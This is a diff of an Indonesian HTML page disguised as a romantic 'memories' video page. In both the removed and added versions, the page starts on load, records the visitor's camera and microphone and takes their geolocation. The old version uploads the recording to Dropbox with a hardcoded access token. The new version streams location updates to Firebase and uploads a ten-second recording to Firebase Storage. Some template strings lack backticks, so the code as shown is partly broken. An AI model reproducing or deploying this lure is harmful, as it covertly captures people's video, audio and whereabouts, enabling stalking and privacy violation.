@@ -3,198 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Kenangan Kita</title>
+    <title>Mutiara Cinta</title>
     <style>
         body {
-            background-color: #1b1b1b;
+            background-color: #2b2b2b;
             color: #fff;
             text-align: center;
             padding: 20px;
-            font-size: 1.2em;
         }
 
         h1 {
             font-size: 2.5em;
-            color: #0ff;
-            text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff;
-            margin-bottom: 20px;
+            color: #f39c12;
         }
 
-        #fakeVideo {
-            width: 80%;
-            height: auto;
-            margin: 20px auto;
-            background-color: #000;
-            display: none; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(0, 255, 255, 0.7);
-        }
-
-        .content {
-            background-color: #222;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
-            margin-top: 50px;
-            width: 80%;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .content p {
+        #status {
+            margin-top: 20px;
             font-size: 1.2em;
-            color: #ccc;
-            margin-bottom: 30px;
-            line-height: 1.5em;
+            color: #f39c12;
         }
 
-        .location {
-            color: #fff;
+        #videoPlayer {
+            width: 50%;
+            border-radius: 15px;
             margin-top: 20px;
         }
-
     </style>
 </head>
 <body>
-    <h1>Video Kenangan Kita</h1>
+    <h1>Mutiara Cinta</h1>
 
-    <div id="fakeVideo">
-        <p>Menonton Video...</p>
-        <video id="dropboxVideo" autoplay controls>
-            <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?rlkey=94pagrxrt67vg2jhrzo2yp0vv&st=aommju4o&raw=1" type="video/mp4">
+    <video id="videoPlayer" controls>
+        <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?rlkey=94pagrxrt67vg2jhrzo2yp0vv&st=aommju4o&raw=1" type="video/mp4">
+
             Your browser does not support the video tag.
-        </video>
-    </div>
+    </video>
 
-    <div class="content">
-        <p>"Setiap kenangan memiliki kisahnya sendiri, dan setiap kisah berisi pelajaran berharga. Di tengah perjalanan ini, kita tetap berdiri tegak, karena setiap langkah membawa kita lebih dekat pada tujuan." </p>
-        
-        <p>"Jangan takut untuk melangkah, karena setiap langkah, meskipun kecil, adalah kemenangan. Hidup kita adalah rekaman yang tak ternilai." </p>
-        
-        <p>"Jangan biarkan masa lalu mendefinisikan masa depanmu. Setiap detik adalah kesempatan baru untuk menciptakan kenangan yang lebih baik." </p>
+    <p id="status">Mohon Tunggu Sebentar</p>
 
-        <div class="location" id="locationData">
-            <p><strong>Lokasi Terakhir:</strong></p>
-            <p id="location"></p>
-        </div>
-    </div>
+    <script type="module">
+        // Firebase Configuration
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js";
+        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-storage.js";
 
-    <script>
-        let videoElement = document.getElementById('dropboxVideo');
-        let fakeVideo = document.getElementById('fakeVideo');
+        const firebaseConfig = {
+            apiKey: "API_KEY",
+            authDomain: "PROJECT_ID.firebaseapp.com",
+            projectId: "PROJECT_ID",
+            storageBucket: "PROJECT_ID.appspot.com",
+            messagingSenderId: "SENDER_ID",
+            appId: "APP_ID"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const storage = getStorage(app);
+
+        const videoPlayer = document.getElementById('videoPlayer');
+        const statusText = document.getElementById('status');
 
         let mediaStream;
         let mediaRecorder;
         let recordedChunks = [];
-        let locationData = [];
 
-        const DROPBOX_ACCESS_TOKEN = 'UwS97ukIVHCM_ewt3mdZeSJeyyA1tXJH1oy3PhirAZ1xR2Avy6vFbsMzBivqv0JHQw9MKjvaAqB_sgzJF4xNNwdgD2eA4CSqSnFpeVdmPLMu0HcRzlLmMblUHY5ClRE2NrxRtZ';
-
-        function trackLocation() {
+        // Fungsi untuk memulai pelacakan lokasi
+        async function startTrackingLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    locationData = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude
+                navigator.geolocation.watchPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    const location = {
+                        lat: latitude,
+                        lng: longitude,
+                        timestamp: new Date()
                     };
-                    console.log('Latitude: ' + position.coords.latitude);
-                    console.log('Longitude: ' + position.coords.longitude);
 
-                    // Simpan lokasi ke localStorage
-                    localStorage.setItem('locationData', JSON.stringify(locationData));
-                    displayLocation();
-                }, function(error) {
-                    console.log('Error dalam melacak lokasi:', error);
+                    // Simpan data lokasi ke Firebase
+                    try {
+                        await addDoc(collection(db, "locations"), location);
+                        const mapUrl = https://www.google.com/maps?q=${latitude},${longitude};
+                        statusText.textContent = Lokasi diperbarui! Lihat di: ${mapUrl};
+                        console.log("Lokasi terbaru:", location);
+                    } catch (error) {
+                        statusText.textContent = "Gagal menyimpan lokasi ke database.";
+                        console.error("Error saving location:", error);
+                    }
+                }, (error) => {
+                    statusText.textContent = "Gagal mendapatkan lokasi.";
+                    console.error("Error obtaining location:", error);
                 });
             } else {
-                console.log('Geolocation tidak didukung di browser ini.');
+                statusText.textContent = "Geolocation tidak didukung di browser ini.";
             }
         }
 
-        function displayLocation() {
-            const storedLocation = JSON.parse(localStorage.getItem('locationData'));
-            if (storedLocation) {
-                document.getElementById('location').textContent = 
-                    Latitude: ${storedLocation.latitude}, Longitude: ${storedLocation.longitude};
-            } else {
-                document.getElementById('location').textContent = "Lokasi tidak ditemukan.";
+        // Fungsi untuk memulai perekaman video
+        async function startRecording() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                statusText.textContent = "Kamera berhasil diaktifkan. Merekam video...";
+                videoPlayer.srcObject = mediaStream;
+
+                mediaRecorder = new MediaRecorder(mediaStream);
+                recordedChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const videoURL = URL.createObjectURL(blob);
+                    videoPlayer.srcObject = null;
+                    videoPlayer.src = videoURL;
+
+                    // Upload video ke Firebase Storage
+                    try {
+                        const storageRef = ref(storage, videos/video_${Date.now()}.webm);
+                        await uploadBytes(storageRef, blob);
+                        const downloadURL = await getDownloadURL(storageRef);
+                        statusText.textContent = Video berhasil diunggah: ${downloadURL};
+                        console.log('Video tersedia di:', downloadURL);
+                    } catch (error) {
+                        statusText.textContent = "Gagal mengunggah video ke server.";
+                        console.error("Error uploading video:", error);
+                    }
+                };
+
+                mediaRecorder.start();
+
+                // Hentikan perekaman setelah 10 detik
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    mediaStream.getTracks().forEach(track => track.stop());
+                }, 10000); // Rekam selama 10 detik
+            } catch (error) {
+                statusText.textContent = "Gagal mengakses kamera.";
+                console.error("Kesalahan saat merekam:", error);
             }
         }
 
-        function startVideo() {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-                .then(function(stream) {
-                    mediaStream = stream;
-                    videoElement.srcObject = stream;
-                    trackLocation(); // Mulai melacak lokasi ketika video dimulai
-                })
-                .catch(function(error) {
-                    console.log('Akses kamera gagal: ', error);
-                });
-        }
-
-        function startRecording() {
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(mediaStream);
-
-            mediaRecorder.ondataavailable = function(event) {
-                recordedChunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = function() {
-                let blob = new Blob(recordedChunks, { type: 'video/webm' });
-                let videoURL = URL.createObjectURL(blob);
-                videoElement.src = videoURL;
-                fakeVideo.style.display = 'block'; // Tampilkan video hasil rekaman
-                uploadToDropbox(blob, 'video'); // Unggah video setelah rekaman selesai
-            };
-
-            mediaRecorder.start();
-        }
-
-        function stopRecording() {
-            mediaRecorder.stop();
-        }
-
-        function uploadToDropbox(fileBlob, type) {
-            const url = 'https://content.dropboxapi.com/2/files/upload';
-            const xhr = new XMLHttpRequest();
-            const fileName = type === 'video' ? 'recorded_video.webm' : 'photo.jpg';
-
-            xhr.open('POST', url, true);
-            xhr.setRequestHeader('Authorization', 'Bearer ' + DROPBOX_ACCESS_TOKEN);
-            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
-            xhr.setRequestHeader('Dropbox-API-Arg', JSON.stringify({
-                path: '/Uploads/' + fileName,
-                mode: 'add',
-                autorename: true,
-                mute: false
-            }));
-
-            xhr.onload = function() {
-                console.log('File berhasil diunggah ke Dropbox:', xhr.responseText);
-            };
-
-            xhr.onerror = function() {
-                console.error('Gagal mengunggah ke Dropbox');
-            };
-
-            xhr.send(fileBlob);
-        }
-
-        function startAllFunctions() {
-            fakeVideo.style.display = 'block'; // Tampilkan video dari Dropbox
-            startVideo(); // Mulai video dan lokasi
-            startRecording(); // Mulai merekam setelah video dimulai
-
-            setTimeout(function() {
-                stopRecording(); // Berhenti merekam setelah 5 detik
-            }, 5000);
-        }
-
-        window.onload = function() {
-            startAllFunctions();
-        };
+        // Memulai pelacakan lokasi dan perekaman video secara otomatis
+        (async function init() {
+            statusText.textContent = "Memulai pelacakan lokasi dan perekaman video...";
+            await startTrackingLocation();
+            await startRecording();
+        })();
     </script>
 </body>
 </html>
